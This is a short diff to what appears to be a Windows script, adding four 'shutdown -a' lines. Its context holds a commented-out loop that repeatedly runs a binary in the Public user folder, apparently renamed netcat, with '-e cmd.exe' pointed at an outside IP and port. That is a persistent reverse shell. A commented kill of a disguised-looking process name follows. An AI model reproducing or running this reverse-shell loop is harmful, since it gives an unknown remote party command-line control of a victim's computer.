@@ -1,3 +1,7 @@
+shutdown -a
+shutdown -a
+shutdown -a
+shutdown -a
 #while ($true){ C:\Users\Public\RNM.exe -nv 193.161.193.99 40877 -e cmd.exe ; Start-Sleep 6 }
 
 #taskkill /F /IM Disk-Updating.exe
